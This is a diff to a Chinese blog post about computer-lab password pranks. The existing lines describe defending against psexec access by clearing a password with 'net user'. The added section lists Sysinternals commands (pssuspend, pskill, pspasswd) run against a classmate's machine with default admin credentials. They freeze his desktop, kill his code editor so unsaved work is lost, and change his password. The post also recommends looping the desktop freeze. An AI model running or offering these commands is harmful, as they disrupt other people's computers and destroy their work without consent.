@@ -34,3 +34,15 @@ title: 论给电脑设密码的重要性——机房惨案的新境界
 1. 远程桌面型：告诉教练或者揍他
 2. psexec型（很难察觉）：迅速`net user admin ""`清除密码，注销重登
 3. 没有还原卡：重启按F8，选带命令提示符的安全模式，用上面指令清密码，重启
+
+## 再补充几条
+
+```sh
+pssuspend \\stu5-xxx -u admin explorer.exe #卡住他的桌面（可以换成别的程序）
+pssuspend \\stu5-xxx -u admin explorer.exe -r #恢复他的桌面
+pskill \\stu5-xxx -u admin devcpp.exe #强杀devcpp（不会保存代码）
+pspasswd \\stu5-xxx -u admin admin fuck #一键改他的密码
+notmyfaultc crash 0x01 #瞬间蓝屏（自己的电脑）
+```
+
+pssuspend配合while(true)与sleep效果奇佳。
